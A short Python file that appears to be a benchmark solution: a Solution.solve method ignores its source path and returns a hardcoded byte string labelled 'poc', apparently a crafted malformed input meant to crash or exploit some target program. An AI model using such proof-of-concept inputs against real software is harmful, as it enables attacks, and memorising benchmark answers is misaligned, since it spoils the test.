class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x00\xff' + b'\x00' * 255 + b'\x02\x03\x00\x00\x00'
        return poc
